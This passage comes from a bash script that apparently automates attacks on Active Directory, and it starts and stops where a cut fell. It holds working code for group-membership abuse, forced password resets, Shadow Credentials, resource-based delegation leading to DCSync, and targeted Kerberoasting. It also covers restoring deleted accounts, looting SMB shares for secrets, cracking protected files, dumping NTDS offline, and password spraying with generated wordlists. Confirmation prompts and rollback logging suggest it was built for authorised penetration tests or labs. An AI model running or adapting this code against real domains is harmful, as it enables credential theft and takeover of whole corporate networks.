    if bloodyAD "${ba[@]}" add groupMember "$grp" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qi 'added\|success'; then
        loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
        rb_record "Added $USER to group $grp" \
                  "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
        # same identity, more rights → re-assess by re-queueing self (force re-run)
        unset 'SEEN_CREDS[${USER,,}]'
        queue_cred "$USER" "$PASS" "$HASH"
    else
        warn "Failed to add to '$grp' (rights may not cover membership)"
    fi
}

# Force-change a target user's password (GenericAll / ForceChangePassword), with rollback note
_abuse_user() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to reset '$target' password)"; return; }
    confirm "  Force-reset password of '${target}' (DESTRUCTIVE — original unknown)?" || return
    run "bloodyAD ${ba[*]} set password '$target' '$PIVOT_PW'"
    if bloodyAD "${ba[@]}" set password "$target" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qi 'success\|changed'; then
        loot "★ Password of '${target}' reset → pivoting as that user"
        rb_record "Reset password of $target (ORIGINAL UNKNOWN — coordinate restore with client)" \
                  "echo 'Manual action required: restore original password for $target'"
        queue_cred "$target" "$PIVOT_PW" ""
    else
        warn "Failed to reset '$target' password"
    fi
}

# Shadow Credentials (msDS-KeyCredentialLink) → recover target's NT hash via PKINIT.
# Non-destructive (certipy 'auto' adds the key, authenticates, then removes it).
# Returns 0 if it recovered a hash.
_abuse_shadowcred() {
    local target="$1"
    have certipy || return 1
    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
    confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
    local cargs=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP")
    if   [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then cargs+=(-k -no-pass)
    elif [[ -n "$HASH" ]]; then cargs+=(-hashes ":$HASH")
    else cargs+=(-p "$PASS"); fi
    run "certipy shadow auto ${cargs[*]}"
    local out; out=$(certipy shadow auto "${cargs[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"
    local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
        loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
        note_cred_source "$target" "Shadow Credentials (msDS-KeyCredentialLink)"
        queue_cred "$target" "" "$nt"
        return 0
    fi
    warn "Shadow Credentials did not yield a hash for $target"; return 1
}

# Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOf… on a
# computer we control, then impersonate Administrator to it.
_abuse_rbcd() {
    local target="$1"   # computer object we can write (e.g. DC$)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try RBCD on '$target')"; return 1; }
    have impacket-getST || return 1
    confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
    local ba; mapfile -t ba < <(bloody_args)
    local comp="adpwn\$" cpass="ADAutoPwn_RBCD_123!"
    run "impacket-addcomputer (adpwn\$) via $USER"
    local addargs=("$DOMAIN/$USER" -dc-ip "$DC_IP" -computer-name 'adpwn$' -computer-pass "$cpass")
    [[ -n "$HASH" ]] && addargs+=(-hashes ":$HASH"); [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]] && addargs+=(-k -no-pass)
    if [[ -n "$PASS" && -z "$HASH" && -z "$KERB_TICKET" ]]; then
        impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1 | tee -a "$LOGFILE"
    else
        impacket-addcomputer "${addargs[@]}" 2>&1 | tee -a "$LOGFILE"
    fi
    rb_record "Created machine account adpwn\$" "bloodyAD ${ba[*]} remove dnsRecord 2>/dev/null; impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -computer-name 'adpwn\$' -delete"
    run "bloodyAD add rbcd '$target' 'adpwn\$'"
    bloodyAD "${ba[@]}" add rbcd "$target" 'adpwn$' 2>&1 | tee -a "$LOGFILE"
    rb_record "Set RBCD on $target → adpwn\$" "bloodyAD ${ba[*]} remove rbcd '$target' 'adpwn\$'"
    local svc="cifs/${target%\$}.${DOMAIN}"
    run "impacket-getST -spn $svc -impersonate Administrator $DOMAIN/adpwn\$"
    rm -f "Administrator@${svc/\//_}@${DOMAIN^^}.ccache" "Administrator.ccache" 2>/dev/null
    impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
    local st; st=$(ls -t *.ccache 2>/dev/null | head -1)
    if [[ -n "$st" ]]; then
        mv -f "$st" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
        loot "★ RBCD → Administrator service ticket for $target → rbcd_admin.ccache"
        note_cred_source "Administrator@$target" "RBCD impersonation"
        # If the target is the DC, that ticket is enough to DCSync
        if [[ "${target%\$}" == "$DC_HOST" ]]; then
            subsection "RBCD ticket targets the DC → secretsdump"
            KRB5CCNAME="$OUTDIR/rbcd_admin.ccache" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
                -outputfile "$OUTDIR/dcsync_rbcd" 2>&1 | tee -a "$LOGFILE" | tee -a "$OUTDIR/secretsdump.txt"
        fi
        return 0
    fi
    warn "RBCD did not produce a ticket for $target"; return 1
}

# Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
_abuse_writespn() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$CAP_KERBEROS" != "1" ]] && return
    warn "WriteSPN over '${C_BOLD}$target${C_RESET}' → targeted Kerberoast possible"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to set a temp SPN and roast '$target')"; return; }
    confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
    local spn="ADAUTOPWN/$target"
    if bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|modif'; then
        rb_record "Set temporary SPN $spn on $target" \
                  "bloodyAD ${ba[*]} remove object '$target' servicePrincipalName -v '$spn'"
        local outf="$OUTDIR/kerberoast_writespn_${target}.txt"
        run "impacket-GetUserSPNs $(imp_principal) -k -no-pass -request-user $target"
        KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass \
            -dc-host "${DC_FQDN:-$DC_IP}" -request-user "$target" -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
        if [[ -s "$outf" ]]; then
            loot "★ WriteSPN Kerberoast hash captured for $target"
            cat "$outf" >>"$OUTDIR/kerberoast_hashes.txt"
            [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
        fi
        bloodyAD "${ba[@]}" remove object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" >/dev/null
        ok "Temporary SPN removed from $target"
    else
        warn "Could not set SPN on $target"
    fi
}

# ===========================================================================
#  DELETED & DISABLED ACCOUNTS  —  detect, and (with --abuse) restore/enable
#  Chain: restore a deleted user → re-enable it → a leaked password now works.
# ===========================================================================
phase_recycle_disabled() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
    have bloodyAD || return
    section "DELETED & DISABLED ACCOUNTS"
    local ba; mapfile -t ba < <(bloody_args)
    local changed=0

    subsection "Disabled accounts (re-enable + a known password = access)"
    local dis
    dis=$(bloodyAD "${ba[@]}" get search \
            --filter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
    if [[ -n "$dis" ]]; then
        echo "$dis" | while read -r u; do echo -e "      ${C_YELLOW}· $u (disabled)${C_RESET}"; done
        echo "$dis" >"$OUTDIR/disabled_accounts.txt"
        if [[ "$DO_ABUSE" == "1" ]]; then
            echo "$dis" | while read -r u; do
                confirm "  Re-enable disabled account '$u'?" || continue
                if bloodyAD "${ba[@]}" remove uac "$u" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|removed|modif'; then
                    loot "★ Re-enabled '$u' → added to spray pool"
                    rb_record "Re-enabled account $u" "bloodyAD ${ba[*]} add uac '$u' -f ACCOUNTDISABLE"
                    echo "$u" >>"$OUTDIR/users_all.txt"; changed=1
                fi
            done
        else
            info "  (report-only; --abuse to re-enable and spray them)"
        fi
    else
        info "No disabled user accounts found"
    fi

    subsection "Deleted objects (AD Recycle Bin)"
    local del
    del=$(bloodyAD "${ba[@]}" get search --filter '(isDeleted=TRUE)' \
            --attr sAMAccountName,distinguishedName -c '1.2.840.113556.1.4.2065' 2>&1)
    if echo "$del" | grep -qiE 'noSuchObject|denied|ERROR|Traceback'; then
        info "Deleted objects not accessible with this identity (need rights / Recycle Bin)"
    elif echo "$del" | grep -qi 'distinguishedName'; then
        echo "$del" | grep -oiP 'distinguishedName:\s*\K.*DEL:[^,]+.*' | while read -r dn; do
            echo -e "      ${C_MAGENTA}· $dn${C_RESET}"; done
        echo "$del" >"$OUTDIR/deleted_objects.txt"
        loot "Deleted objects present — restorable if you hold the rights"
        if [[ "$DO_ABUSE" == "1" ]]; then
            echo "$del" | grep -oiP 'distinguishedName:\s*\K\S.*' | grep -i 'DEL:' | while read -r dn; do
                local name; name=$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')
                confirm "  Restore deleted object '$name'?" || continue
                if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
                    loot "★ Restored '$name' — will re-enable & spray"
                    rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
                    [[ -n "$name" ]] && { echo "$name" >>"$OUTDIR/users_all.txt"
                        bloodyAD "${ba[@]}" remove uac "$name" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null; }
                fi
            done
        else
            info "  (report-only; --abuse to restore them)"
        fi
    else
        info "No deleted objects found"
    fi
    [[ "$changed" == "1" ]] && sort -u -o "$OUTDIR/users_all.txt" "$OUTDIR/users_all.txt"
}

# ===========================================================================
#  CLEANUP  —  revert every change this tool made (responsible teardown)
# ===========================================================================
run_cleanup() {
    section "CLEANUP · REVERTING TOOL-MADE CHANGES"
    if [[ ! -s "$ROLLBACK_FILE" ]]; then
        ok "No tracked changes to revert — nothing to clean up"
        return
    fi
    warn "The following changes were made and will be reverted:"
    grep '^### ' "$ROLLBACK_FILE" | sed 's/^### /      - /'
    confirm "Proceed with rollback?" || { info "Cleanup aborted by operator"; return; }
    # Execute every non-comment line as an undo command
    grep -v '^### ' "$ROLLBACK_FILE" | while IFS= read -r cmd; do
        [[ -z "$cmd" ]] && continue
        run "$cmd"; eval "$cmd" 2>&1 | tee -a "$LOGFILE"
    done
    ok "Rollback complete. Reminder: this tool never touched event logs — confirm log integrity with the client."
}

# ===========================================================================
#  SHARE LOOTING  —  spider readable shares, pull & process interesting files
# ===========================================================================
# Extract a crackable hash from a password-protected file and crack it.
crack_file() {
    local f="$1" base ext tool
    base="$(basename "$f")"; ext="${base##*.}"; ext="${ext,,}"
    case "$ext" in
        xls|xlsx|xlsm|doc|docx|ppt|pptx) tool=office2john ;;
        pdf)  tool=pdf2john ;;
        zip)  tool=zip2john ;;
        rar)  tool=rar2john ;;
        7z)   tool=7z2john ;;
        kdbx) tool=keepass2john ;;
        *) case "$base" in id_rsa|*.ppk|*.pem|*.key) tool=ssh2john ;; *) return ;; esac ;;
    esac
    have "$tool" || { warn "$tool not installed — cannot process $base"; return; }
    local hashf="$OUTDIR/filehash_${base}.txt"
    "$tool" "$f" 2>/dev/null >"$hashf"
    [[ ! -s "$hashf" ]] && { rm -f "$hashf"; return; }
    loot "Crackable hash extracted from ${C_BOLD}${base}${C_RESET} → cracking with john…"
    run "john --wordlist=$WORDLIST $hashf"
    john --wordlist="$WORDLIST" "$hashf" >/dev/null 2>&1
    local show pw
    show=$(john --show "$hashf" 2>/dev/null | grep -vE 'password hash|^$' | head -1)
    pw=$(echo "$show" | cut -d: -f2)
    if [[ -n "$pw" ]]; then
        loot "★ File password cracked → ${base} : ${C_GREEN}${C_BOLD}${pw}${C_RESET}"
        echo "${base}:${pw}" >>"$OUTDIR/cracked_files.txt"
        add_secret "$pw" "doc password: $base"
        decrypt_and_read "$f" "$pw" "$ext"
    else
        info "Could not crack ${base} with this wordlist"
    fi
}

# Decrypt an office/zip file with the cracked password and harvest its contents
decrypt_and_read() {
    local f="$1" pw="$2" ext="$3" base; base="$(basename "$f")"
    local dec="$OUTDIR/decrypted_${base}"
    case "$ext" in
        xls|xlsx|xlsm|doc|docx|ppt|pptx)
            if have msoffcrypto-tool; then
                msoffcrypto-tool "$f" "$dec" -p "$pw" 2>/dev/null \
                    && ok "Decrypted → decrypted_${base}" || { warn "msoffcrypto-tool could not decrypt"; return; }
            else
                warn "msoffcrypto-tool not installed → cannot auto-decrypt (install: pipx install msoffcrypto-tool)"; return
            fi ;;
        zip) mkdir -p "${dec}.d"; unzip -P "$pw" -o "$f" -d "${dec}.d" >/dev/null 2>&1 && dec="${dec}.d" ;;
        *) return ;;
    esac
    subsection "Reading decrypted contents of ${base} for credentials"
    # Extract ONLY human-readable cell/paragraph text (not the file's XML internals)
    local txt=""
    case "$ext" in
        xlsx|xlsm) txt=$(unzip -p "$dec" 'xl/sharedStrings.xml' 2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        docx)      txt=$(unzip -p "$dec" 'word/document.xml'     2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        pptx)      txt=$(unzip -p "$dec" 'ppt/slides/slide*.xml' 2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        *)         [[ -d "$dec" ]] && txt=$(find "$dec" -type f -exec cat {} + 2>/dev/null) || txt=$(strings -n 4 "$dec" 2>/dev/null) ;;
    esac
    printf '%s\n' "$txt" | grep -vE '^\s*$' | sort -u | tee "$OUTDIR/content_${base}.txt" | head -40
    harvest_secrets <<<"$txt" "$base"
}

# Pull likely passwords out of free text and feed them to the engine.
# Strategy: (1) keyword-anchored secrets (high confidence), (2) a few standalone
# strong tokens (upper+lower+digit, len>=8). Junk (paths/xml) is filtered out.
harvest_secrets() {
    local label="${1:-text}" text; text=$(cat)
    local -a hits=()
    # (1) "password/pwd/reset to/set to/secret : X"  →  X
    while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
        printf '%s\n' "$text" | grep -oiP '(password|passwd|pwd|pass(?:word)?|reset to|set to|secret|creds?)\s*(?:is|was|to|[:=])?\s*\K[A-Za-z0-9!@#$%^&*._-]{6,40}' )
    # (2) standalone strong tokens (capped to avoid lockout-spray noise)
    while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
        printf '%s\n' "$text" | grep -oP '\b(?=[A-Za-z0-9!@#$%^&*._-]*[A-Z])(?=[A-Za-z0-9!@#$%^&*._-]*[a-z])(?=[A-Za-z0-9!@#$%^&*._-]*[0-9])[A-Za-z0-9!@#$%^&*._-]{8,40}\b' | sort -u | head -8 )
    local added=0 s
    for s in "${hits[@]}"; do
        # filter obvious non-secrets
        [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
        [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol)$ ]] && continue
        if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
            loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
            add_secret "$s" "harvested from $label"; added=$((added+1))
        fi
    done
    [[ "$added" == "0" ]] && info "No clear passwords harvested from ${label}"
}

# Process NTDS.dit + SYSTEM hive offline to recover all domain hashes
phase_ntds_local() {
    local ntds="$1" system="$2"
    have impacket-secretsdump || return
    subsection "Offline NTDS extraction (secretsdump LOCAL)"
    run "impacket-secretsdump -ntds $ntds -system $system LOCAL"
    impacket-secretsdump -ntds "$ntds" -system "$system" LOCAL -outputfile "$OUTDIR/ntds_local" 2>&1 \
        | tee -a "$LOGFILE" | tee "$OUTDIR/ntds_local.txt"
    if grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null; then
        loot "★★★★★ NTDS DUMPED OFFLINE — domain NTLM hashes recovered"
        grep -E ':::' "$OUTDIR/ntds_local.txt" | while read -r line; do
            local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
        done
        grep -iE '^administrator:' "$OUTDIR/ntds_local.txt" | head -1 | while read -r l; do
            local h; h=$(echo "$l" | cut -d: -f4)
            loot "ADMINISTRATOR hash: $h"; queue_cred "Administrator" "" "$h"
        done
        [[ "$DO_CRACK" == "1" ]] && {
            grep -E ':::' "$OUTDIR/ntds_local.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntds_ntlm.txt"
            crack_hashes "$OUTDIR/ntds_ntlm.txt" 1000 "NTLM"; }
    fi
}

phase_share_loot() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
    section "SHARE LOOTING · INTERESTING FILES"
    local args; mapfile -t args < <(nxc_cred_args)
    local dl="$OUTDIR/shares"; mkdir -p "$dl"

    subsection "Spidering readable shares and downloading files (≤5MB)"
    run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 OUTPUT_FOLDER=$dl"
    $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 OUTPUT_FOLDER="$dl" 2>&1 \
        | tail -25 | tee -a "$LOGFILE"

    local files; files=$(find "$dl" -type f 2>/dev/null)
    [[ -z "$files" ]] && { info "No files downloaded from shares"; return; }
    loot "$(echo "$files" | wc -l) files pulled from shares → $dl"

    subsection "Hunting credentials inside downloaded files"
    grep -rEisn 'password|passwd|pwd=|connectionstring|secret|api[_-]?key|cpassword' "$dl" 2>/dev/null \
        | grep -vEi '\.(dll|exe|png|jpg)' | head -40 | tee "$OUTDIR/share_secrets.txt"
    [[ -s "$OUTDIR/share_secrets.txt" ]] && loot "Potential secrets in files → share_secrets.txt"
    # Harvest passwords from small text/config files and feed the engine
    find "$dl" -type f -size -200k \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
        -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \) \
        -exec cat {} + 2>/dev/null | harvest_secrets "shares"

    subsection "Cracking password-protected documents found on shares"
    while IFS= read -r f; do
        case "${f,,}" in
            *.xls|*.xlsx|*.xlsm|*.doc|*.docx|*.ppt|*.pptx|*.pdf|*.zip|*.rar|*.7z|*.kdbx) crack_file "$f" ;;
            *id_rsa|*.ppk|*.pem|*.key) loot "Private/SSH key found: $f"; echo "$f" >>"$OUTDIR/ssh_keys.txt" ;;
        esac
    done <<<"$files"

    # NTDS + SYSTEM backups → recover everything offline
    local ntds system
    ntds=$(echo "$files"   | grep -iE 'ntds\.dit$' | head -1)
    system=$(echo "$files" | grep -iE '(/|_|\.)SYSTEM(\.(hiv|bak|save|old))?$' | head -1)
    if [[ -n "$ntds" && -n "$system" ]]; then
        loot "★★★ NTDS.dit + SYSTEM hive found in shares!"
        phase_ntds_local "$ntds" "$system"
    fi

    # DPAPI material → guidance (decryption is environment-specific)
    if echo "$files" | grep -qiE 'Protect/|Credentials|Vault|masterkey'; then
        warn "DPAPI material found. Recover with: impacket-dpapi masterkey → then credential (needs the owner's password/SID)."
    fi
}

# ===========================================================================
#  USERNAME VARIANTS  —  derive common AD naming formats and validate them
#  (kerbrute userenum only checks existence → no password attempt, no lockout)
# ===========================================================================
VARIANTS_DONE=0
phase_user_variants() {
    [[ "$VARIANTS_DONE" == "1" || -z "$DOMAIN" || "$CAP_KERBEROS" != "1" ]] && return
    [[ ! -x "$KERBRUTE_BIN" || ! -s "$OUTDIR/users_all.txt" ]] && return
    VARIANTS_DONE=1
    section "USERNAME VARIANTS · derive & validate alternate account formats"

    local vf="$OUTDIR/users_variants.txt"
    awk '
    {
      u=tolower($0); print u
      n=split(u,p,/[._-]/)
      if (n>=2) {
        f=p[1]; l=p[n]; fi=substr(f,1,1); li=substr(l,1,1)
        print f; print l
        print f"."l; print f"_"l; print f"-"l; print f l
        print fi l; print fi"."l; print l fi; print l"."f
        print f li; print l f
      }
    }' "$OUTDIR/users_all.txt" 2>/dev/null | sort -u >"$vf"
    # keep only NEW candidates not already known-valid
    comm -23 "$vf" "$OUTDIR/users_all.txt" >"${vf}.new" 2>/dev/null && mv "${vf}.new" "$vf"
    [[ ! -s "$vf" ]] && { info "No new username variants to test"; return; }

    subsection "Validating $(wc -l <"$vf") candidate usernames (kerbrute userenum)"
    run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP users_variants.txt"
    "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$vf" 2>&1 | tee -a "$LOGFILE" \
        | grep -i 'VALID USERNAME' | grep -oiP '\K[A-Za-z0-9._-]+(?=@)' | sort -u >"$OUTDIR/users_variants_valid.txt"
    if [[ -s "$OUTDIR/users_variants_valid.txt" ]]; then
        loot "New valid accounts via variants:"
        while read -r u; do echo -e "      ${C_GREEN}· $u${C_RESET}"; done <"$OUTDIR/users_variants_valid.txt"
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
    else
        info "No additional accounts discovered from variants"
    fi
}

# ===========================================================================
#  PASSWORD SPRAY  —  spray every recovered password across all known users
#  (this is what turns a single cracked file/hash into domain-wide pivots)
# ===========================================================================
# Spray a single password across all users and queue any valid hit
_spray_one() {
    local pw="$1"
    "$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
        | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)' | while read -r u; do
            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
            note_cred_source "${u}:${pw}" "password spray"
            queue_cred "$u" "$pw" ""
        done
}

phase_password_spray() {
    [[ "$CAP_KERBEROS" != "1" || ! -x "$KERBRUTE_BIN" || ! -s "$OUTDIR/users_all.txt" ]] && return
    local pw new=0
    for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[$pw]:-}" ]] && new=1; done

    # 1) Spray recovered secrets (low risk: 1 attempt/user per password)
    if [[ "$new" == "1" ]]; then
        section "PASSWORD SPRAY · recovered secrets × all users"
        for pw in "${!FOUND_SECRETS[@]}"; do
            [[ -n "${SPRAYED[$pw]:-}" ]] && continue
            SPRAYED["$pw"]=1
            subsection "Spraying a recovered password against $(wc -l <"$OUTDIR/users_all.txt") users"
            run "$KERBRUTE_BIN passwordspray -d $DOMAIN --dc $DC_IP users_all.txt '<secret>'"
            _spray_one "$pw"
        done
    fi

    # 2) Domain-focused dictionary spray — OPT-IN (--spray): account-lockout risk
    if [[ "$SPRAY_GEN" == "1" && -s "$DOMAIN_WL" && -z "${SPRAYED[__GEN__]:-}" ]]; then
        SPRAYED[__GEN__]=1
        section "PASSWORD SPRAY · domain-focused dictionary (--spray)"
        warn "Lockout risk: each candidate = 1 bad attempt per user. Capping to the safest few."
        local cap=6 i=0
        while IFS= read -r pw && (( i < cap )); do
            [[ -z "$pw" || -n "${SPRAYED[$pw]:-}" ]] && continue
            SPRAYED["$pw"]=1; i=$((i+1))
            subsection "[$i/$cap] Spraying '$pw'"
            run "$KERBRUTE_BIN passwordspray -d $DOMAIN --dc $DC_IP users_all.txt '$pw'"
            _spray_one "$pw"
        done <"$DOMAIN_WL"
        info "Generated spray capped at $cap candidates to protect accounts (raise manually if policy allows)"
    fi
}

# ===========================================================================
#  DOMAIN-FOCUSED WORDLIST  —  high-probability candidates from the target
#  (used first for OFFLINE cracking; optionally for capped online spray)
# ===========================================================================
gen_domain_wordlist() {
    local out="$OUTDIR/domain_wordlist.txt"
    [[ -s "$out" ]] && { DOMAIN_WL="$out"; return; }
    [[ -z "$DOMAIN" ]] && return
    local short="${DOMAIN%%.*}"                       # voleur.htb -> voleur
    local yr; yr=$(date +%Y); local pyr=$((yr-1)) ; local ppyr=$((yr-2))
    local -a bases=("$short" "${short^}" "${short^^}")
    [[ -n "$DC_HOST" ]] && bases+=("$DC_HOST" "${DC_HOST^}")
    local -a seasons=(Spring Summer Autumn Fall Winter)
    local -a suffix=("" "1" "12" "123" "1234" "!" "123!" "@123" "#1" "2024" "2025" "2026" "$yr" "$pyr" "${yr}!" "${pyr}!" "01")
    { for b in "${bases[@]}"; do for s in "${suffix[@]}"; do echo "${b}${s}"; done; done
      for se in "${seasons[@]}"; do for y in "$yr" "$pyr" "$ppyr"; do
          echo "${se}${y}"; echo "${se}${y}!"; echo "${se}@${y}"; done; done
      # Common corporate defaults
      printf '%s\n' Welcome1 Welcome1! Welcome123 Welcome123! Password1 Password1! \
          Password123 Password123! P@ssw0rd 'P@ssw0rd!' 'P@ssw0rd123' Changeme123 \
          Changeme123! Letmein123! Summer123! Company123! Admin123! Qwerty123!
    } | sort -u >"$out"
    DOMAIN_WL="$out"
    ok "Domain-focused wordlist generated → $(wc -l <"$out") candidates (domain_wordlist.txt)"
}

# ===========================================================================
#  OFFLINE CRACKING  (hashcat + wordlist)
# ===========================================================================
crack_hashes() {
    local file="$1" mode="$2" label="$3"
    [[ ! -s "$file" ]] && return
    subsection "Cracking $label (hashcat -m $mode)"
    # 1) domain-focused candidates first (fast, high hit-rate), then rockyou
    if [[ -s "$DOMAIN_WL" ]]; then
        run "hashcat -m $mode <file> domain_wordlist.txt -O"
        hashcat -m "$mode" "$file" "$DOMAIN_WL" -O 2>&1 | tee -a "$LOGFILE"
    fi
    if [[ -f "$WORDLIST" ]]; then
        run "hashcat -m $mode <file> $WORDLIST -O"
        hashcat -m "$mode" "$file" "$WORDLIST" -O 2>&1 | tee -a "$LOGFILE"
    elif [[ ! -s "$DOMAIN_WL" ]]; then
        warn "No wordlist available, skipping $label cracking"; return
    fi
    local cracked; cracked=$(hashcat -m "$mode" "$file" --show 2>/dev/null)
    if [[ -n "$cracked" ]]; then
        loot "★★★ CRACKED CREDENTIALS ($label) ★★★"
        echo "$cracked" | while IFS= read -r line; do echo -e "      ${C_GREEN}${C_BOLD}$line${C_RESET}"; done
        echo "$cracked" >>"$OUTDIR/cracked_passwords.txt"
        # Feed cracked plaintext back into the pivot queue (user:password)
        while IFS= read -r line; do
            local pw user
            pw="${line##*:}"
            add_secret "$pw" "cracked $label hash"
            case "$label" in
                AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
                Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+') ;;
                NTLM)       # map NT hash back to a username via the DCSync output
                    local nt="${line%%:*}"
                    user=$(grep -iE ":${nt}:::" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f1) ;;
            esac
            [[ -n "$user" && -n "$pw" ]] && queue_cred "$user" "$pw" ""
        done <<<"$cracked"
    else
        info "Nothing cracked for $label with this wordlist"
    fi
}

# ===========================================================================
#  FINAL SUMMARY
# ===========================================================================
final_summary() {
    section "OPERATION SUMMARY"
    echo -e "  ${C_BOLD}Target:${C_RESET}        $DC_IP  (${DC_FQDN:-?})"
    echo -e "  ${C_BOLD}Domain:${C_RESET}        ${DOMAIN:-?}"
    echo -e "  ${C_BOLD}Auth mode:${C_RESET}     $([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
    echo -e "  ${C_BOLD}Authenticated:${C_RESET} $([[ $HAVE_AUTH == 1 ]] && echo "${C_GREEN}YES ($USER)${C_RESET}" || echo "${C_YELLOW}NO${C_RESET}")"
    echo -e "  ${C_BOLD}Loot dir:${C_RESET}      $OUTDIR"
    hr
    [[ -s "$OUTDIR/users_all.txt" ]]         && loot "Enumerated users:    $(wc -l <"$OUTDIR/users_all.txt")"
    [[ -s "$OUTDIR/asrep_hashes.txt" ]]      && loot "AS-REP hashes:       $(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt")"
    [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && loot "Kerberoast hashes:   $(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt" 2>/dev/null)"
    [[ -s "$OUTDIR/secretsdump.txt" ]]       && loot "NTLM hashes (DCSync):$(grep -cE ':::' "$OUTDIR/secretsdump.txt")"
    [[ -s "$OUTDIR/cracked_passwords.txt" ]] && loot "Cracked passwords:   $(wc -l <"$OUTDIR/cracked_passwords.txt")"
    grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && loot "Vulnerable ADCS:     YES (see certipy_find.txt)"

    # Credential provenance map — where every secret/identity came from
    if [[ -s "$OUTDIR/credential_map.txt" || -s "$OUTDIR/valid_creds_map.txt" ]]; then
        subsection "Credential map (what we got & where it came from)"
        if [[ -s "$OUTDIR/valid_creds_map.txt" ]]; then
            echo -e "    ${C_BOLD}Working identities:${C_RESET}"
